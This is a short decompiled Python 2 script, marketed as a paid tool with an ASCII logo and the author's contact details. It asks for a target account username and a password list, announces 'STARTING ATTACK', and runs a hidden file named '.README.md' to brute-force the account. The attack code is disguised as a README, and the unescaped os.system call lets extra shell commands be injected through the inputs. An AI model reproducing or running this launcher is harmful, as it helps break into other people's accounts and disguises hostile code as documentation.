 # Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-09-18 10:43:32.884705
import os, sys, time
os.system('clear')
logo = '\n\x1b[34m     #    # #######       #    #    \n #   #  #     #       #   # #   \n #  #   #     #       #  #   #  \n ###    #     #       # #     # \n #  #   #     # #     # ####### \n #   #  #     # #     # #     # \n #    # #######  #####  #     #  \n\n\n\x1b[1;91m   Author      :     Muhammad Ali   \n\x1b[1;92m   Github      :     koja-xd \n\x1b[1;92m   KING OF     :     Hasilpur (Pak)\n\x1b[1;91m   TOOL TYPE   :     PAID COMMANDS\n\x1b[1;92m   WAP NUMBER  :     03027383451           \n   '      
print logo
id = raw_input('\n \x1b[1;92m[+] \x1b[1;94mENTER TARGET ACCOUNT USERNAME/ID ==> \x1b[1;96m')
list = raw_input('\n \x1b[1;92m[+] \x1b[1;94mENTER PASSWORD LIST FILE ==> \x1b[1;96m')
print '\n\t\tSTARTING ATTACK...'
os.system('clear')
time.sleep(1)
os.system('python .README.md -t ' + id + ' -w ' + list)
